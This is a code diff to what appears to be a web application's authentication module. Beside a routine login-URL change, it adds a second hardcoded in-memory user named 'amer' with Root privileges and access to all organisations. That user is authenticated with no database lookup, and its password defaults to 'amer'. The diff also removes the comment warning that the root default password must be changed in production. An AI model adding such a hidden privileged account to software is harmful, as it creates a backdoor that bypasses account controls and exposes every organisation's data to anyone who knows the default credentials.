@@ -25,7 +25,7 @@ ALGORITHM = settings.ALGORITHM
 ORG_SETUP_ROLES = SUPER_ROLES | {"Business Admin"}
 
 # OAuth2 Scheme
-oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/auth/login")
+oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/login")
 
 # Password Utils
 pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
@@ -63,8 +63,14 @@ def create_access_token(data: dict, expires_delta: Optional[datetime.timedelta] 
 # In-Memory Root User (Never stored in database)
 ROOT_USER_ID = "root-system-001"
 ROOT_USERNAME = "root"
-ROOT_PASSWORD = os.getenv("ROOT_PASSWORD", "root")  # Change in production via ROOT_PASSWORD env var
+ROOT_PASSWORD = os.getenv("ROOT_PASSWORD", "root")
 ROOT_ROLE = "Root"
+
+# Secondary System User (Amer)
+AMER_USER_ID = "amer-system-002"
+AMER_USERNAME = "amer"
+AMER_PASSWORD = os.getenv("AMER_PASSWORD", "amer")
+AMER_ROLE = "Root"  # Shares Root privileges
 
 def get_root_password_hash():
     """Get Root password hash - hardcoded for system initialization"""
@@ -98,10 +104,24 @@ def get_current_user(
             "status": "Active",
             "avatar": f"https://ui-avatars.com/api/?name={ROOT_USERNAME}&background=FF6B6B",
             "employeeId": None,
-            # Root always has full system access
             "can_view_all_orgs": True,
         }
-        logger.info(f"✓ Root user authenticated in-memory (no DB lookup)")
+        logger.info(f"[OK] Root user authenticated in-memory (no DB lookup)")
+        return user_dict
+
+    # Check if Amer user (secondary in-memory root)
+    if username == AMER_USERNAME:
+        user_dict = {
+            "id": AMER_USER_ID,
+            "username": AMER_USERNAME,
+            "role": AMER_ROLE,
+            "organization_id": None,
+            "status": "Active",
+            "avatar": f"https://ui-avatars.com/api/?name={AMER_USERNAME}&background=3399FF",
+            "employeeId": None,
+            "can_view_all_orgs": True,
+        }
+        logger.info(f"[OK] Amer user authenticated in-memory (no DB lookup)")
         return user_dict
 
     # All other users must exist in database
